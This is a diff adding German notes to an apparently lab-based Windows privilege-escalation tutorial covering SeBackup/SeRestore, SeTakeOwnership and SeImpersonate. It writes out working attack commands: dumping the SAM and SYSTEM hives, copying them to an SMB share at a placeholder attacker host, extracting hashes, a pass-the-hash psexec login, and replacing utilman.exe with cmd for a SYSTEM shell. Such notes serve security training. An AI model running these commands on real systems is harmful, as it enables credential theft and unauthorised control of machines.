@@ -315,21 +315,118 @@ whoami /priv
 Eine vollständige Liste der verfügbaren Berechtigungen auf Windows-Systemen ist hier zu finden (https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants). Vom Standpunkt eines Angreifers aus sind nur die Privilegien von Interesse, die eine Eskalation im System ermöglichen. Eine umfassende Liste der ausnutzbaren Privilegien kann auf dem Github-Projekt Priv2Admin gefunden werden. https://github.com/gtworek/Priv2Admin
 
 ### SeBackup / SeRestore
+Die Privilegien SeBackup und SeRestore erlauben es den Benutzern, jede Datei im System zu lesen und zu schreiben, ohne Rücksicht auf bestehende DACL. Die Idee hinter diesem Privileg ist es, bestimmten Benutzern die Möglichkeit zu geben, Backups von einem System durchzuführen, ohne volle administrative Rechte zu benötigen.
+
+Mit dieser Befugnis kann ein Angreifer auf triviale Weise seine Privilegien auf dem System ausweiten, indem er viele Techniken einsetzt. Die Methode in dem Beispiel untersuchte besteht darin, die SAM- und SYSTEM-Registry-Hives zu kopieren, um den Hash des lokalen Administrator-Passworts zu extrahieren.
+
+Da der Hierfür benutzte user Bereits ein Admin ist können wir hergehen und eine Admin CMD öffnen damit wir dann im nächsten schritt schauen können wie genau die Berechtigungen der Nutzer sind. Das Geht dann via: 
+
+```
+whoami/priv
+```
+
+Dass sollte ungefähr dann so aussehen:
+https://imgur.com/Cu0vLs8
+
+Um die SAM- und SYSTEM-Hashes zu sichern, können wir die folgenden Befehle verwenden:
+
+```
+reg save hklm\system C:\Users\THMBackup\system.hive
+
+reg save hklm\sam C:\Users\THMBackup\sam.hive
+```
+
+  
+Dadurch werden einige Dateien mit dem Inhalt der Registrierungsdateien erstellt. Wir können diese Dateien nun mit SMB oder einer anderen verfügbaren Methode auf unseren Angreifer-Rechner kopieren. Für SMB können wir die Datei smbserver.py von impacket verwenden, um einen einfachen SMB-Server mit einer Netzwerkfreigabe im aktuellen Verzeichnis unserer AttackBox zu starten:
+
+```
+mkdir share 
+python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
+```
+  
+Dadurch wird eine Freigabe mit dem Namen public erstellt, die auf das Freigabeverzeichnis verweist und den Benutzernamen und das Passwort unserer aktuellen Windows-Sitzung erfordert. Danach können wir den Kopierbefehl in unserem Windows-Rechner verwenden, um beide Dateien auf unsere AttackBox zu übertragen:
+```
+C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\ 
+C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
+```
+
+Und verwenden dann impacket, um die Passwort-Hashes der Benutzer abzurufen:
+
+```
+python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
+```  
+
+Schließlich können wir den Hash des Administrators verwenden, um einen Pass-the-Hash-Angriff durchzuführen und Zugang zum Zielcomputer mit SYSTEM-Rechten zu erhalten:
+
+```
+python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.10.198.160
+```
 
 
+### SeTakeOwnership
+Das SeTakeOwnership-Privileg erlaubt es einem Benutzer, das Eigentum an jedem Objekt auf dem System zu übernehmen, einschließlich Dateien und Registry-Schlüsseln, was einem Angreifer viele Möglichkeiten eröffnet, seine Privilegien zu erhöhen, da wir zum Beispiel nach einem Dienst suchen könnten, der als SYSTEM läuft, und das Eigentum an der ausführbaren Datei des Dienstes übernehmen könnten. 
+
+Das Beispiel wird aber auf anderem Wege die Privilegien erweitern
+
+Wie Zuvor auch brauchen wir am Anfang eine Admin CMD in der wir schauen welche Rechte wir haben, das geht wieder via 
+
+```
+whoami /priv
+```
+und Das Resultat sollte ungefähr so aussehen: 
+
+https://imgur.com/0BBlKps
 
 
+Diesmal missbrauchen wir utilman.exe, um die Berechtigungen zu erweitern. Utilman ist eine integrierte Windows-Anwendung, die dazu dient, während des Sperrbildschirms Optionen zur Erleichterung des Zugangs bereitzustellen. Da Utilman mit SYSTEM-Privilegien ausgeführt wird, erhalten wir effektiv SYSTEM-Privilegien, wenn wir die ursprüngliche Binärdatei durch eine beliebige Payload ersetzen. Da wir das Eigentum an jeder Datei übernehmen können, ist das Ersetzen trivial.
 
+Um utilman zu ersetzen, übernehmen wir zunächst mit dem folgenden Befehl die Rechte an der Datei:
 
+```
+takeown /f C:\Windows\System32\Utilman.exe
+```
 
+Zu Beachten ist hier dass das Besitzen einer Datei nicht unbedingt Bedeutet dass man auch die Rechte über diese hat, <aber als Besitzer kann man sich selbst alle Rechte geben, die man braucht. Um Ihrem Benutzer volle Rechte auf utilman.exe zu geben, können Sie den folgenden Befehl verwenden:
 
+```
+icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
+```
 
+Danach ersetzen wir noch die utilman.exe mit einer Copie der CMD Damit wir beim starten der Modifizierten Utilman exe eine Shell bekommen mit System Rechten. 
 
+Danach kann das Gerät gesperrt werden und über Utilman wie oben geschildert eine Shell Gespawnt werden mit System Rechten.
 
+### SeImpersonate / SeAssignPrimaryToken
 
+Basic Erklärung der Idee dahinter:
 
+Diese Privilegien ermöglichen es einem Prozess, sich als ein anderer Benutzer auszugeben und in dessen Namen zu handeln. Impersonation besteht in der Regel darin, dass ein Prozess oder Thread unter dem Sicherheitskontext eines anderen Benutzers gestartet werden kann.
+Impersonation ist leicht zu verstehen, wenn man sich vor Augen führt, wie ein FTP-Server funktioniert. Der FTP-Server muss den Zugriff der Benutzer auf die Dateien beschränken, die sie sehen dürfen.
+Nehmen wir an, wir haben einen FTP-Dienst, der mit dem Benutzer ftp läuft. Ohne Impersonation würde der FTP-Dienst, wenn sich die Benutzerin Ann beim FTP-Server anmeldet und versucht, auf ihre Dateien zuzugreifen, versuchen, mit seinem Zugriffstoken und nicht mit dem von Ann zuzugreifen:
+https://imgur.com/4xyUjqI
+  
 
+Es gibt mehrere Gründe, warum die Verwendung des FTP-Tokens nicht die beste Idee ist: - Damit die Dateien korrekt zugestellt werden können, müssen sie für den FTP-Benutzer zugänglich sein. Im obigen Beispiel könnte der FTP-Dienst auf die Dateien von Ann zugreifen, aber nicht auf die von Bill, da die DACL in Bills Dateien dem Benutzer ftp nicht erlaubt. Dies macht die Sache noch komplizierter, da wir für jede bereitgestellte Datei/jedes bereitgestellte Verzeichnis manuell spezifische Berechtigungen konfigurieren müssen. - Für das Betriebssystem erfolgt der Zugriff auf alle Dateien per Benutzer-ftp, unabhängig davon, welcher Benutzer gerade beim FTP-Dienst angemeldet ist. Dies macht es unmöglich, die Berechtigung an das Betriebssystem zu delegieren; daher muss der FTP-Dienst sie implementieren. - Wenn der FTP-Dienst irgendwann kompromittiert würde, hätte der Angreifer sofort Zugriff auf alle Ordner, auf die der FTP-Benutzer Zugriff hat.
+Verfügt der Benutzer des FTP-Dienstes hingegen über das Privileg SeImpersonate oder SeAssignPrimaryToken, wird all dies etwas vereinfacht, da der FTP-Dienst vorübergehend das Zugriffstoken des sich anmeldenden Benutzers an sich nehmen und damit beliebige Aufgaben in dessen Namen ausführen kann:
+https://imgur.com/YEkVOkV
 
+Wenn sich nun die Benutzerin Ann beim FTP-Dienst anmeldet und der ftp-Benutzer über Impersonation-Rechte verfügt, kann er sich Anns Zugriffstoken ausleihen und damit auf ihre Dateien zugreifen. Auf diese Weise müssen die Dateien dem Benutzer ftp keinerlei Zugriff gewähren, und das Betriebssystem übernimmt die Autorisierung. Da der FTP-Dienst sich als Ann ausgibt, kann er während dieser Sitzung nicht auf die Dateien von Jude oder Bill zugreifen.
+
+  
+
+Wenn es uns als Angreifer gelingt, die Kontrolle über einen Prozess mit SeImpersonate- oder SeAssignPrimaryToken-Rechten zu übernehmen, können wir uns als jeder Benutzer ausgeben, der sich mit diesem Prozess verbindet und authentifiziert.
+In Windows-Systemen verfügen die Konten LOCAL SERVICE und NETWORK SERVICE bereits über solche Berechtigungen. Da diese Konten verwendet werden, um Dienste mit eingeschränkten Konten zu starten, ist es sinnvoll, ihnen zu erlauben, sich als Benutzer auszugeben, wenn der Dienst dies benötigt. Internet Information Services (IIS) erstellt auch ein ähnliches Standardkonto namens „iis apppool\defaultapppool“ für Webanwendungen.
+
+Um die Berechtigungen mit Hilfe solcher Konten zu erhöhen, benötigt ein Angreifer Folgendes: 
+1. Er muss einen Prozess erstellen, damit Benutzer eine Verbindung herstellen und sich bei diesem authentifizieren können, um sich als Person ausgeben zu können. 
+2. Einen Weg finden, um privilegierte Benutzer zu zwingen, sich mit dem erzeugten bösartigen Prozess zu verbinden und zu authentifizieren.
+
+  
+Beispiel
+Wir werden den RogueWinRM-Exploit verwenden, um beide Bedingungen zu erfüllen.
+https://imgur.com/4AUBQ2T
+https://imgur.com/qW0KJuh
+https://imgur.com/CN9TDTw
 
 # Ausnutzen von Software mit Schwachstellen
 
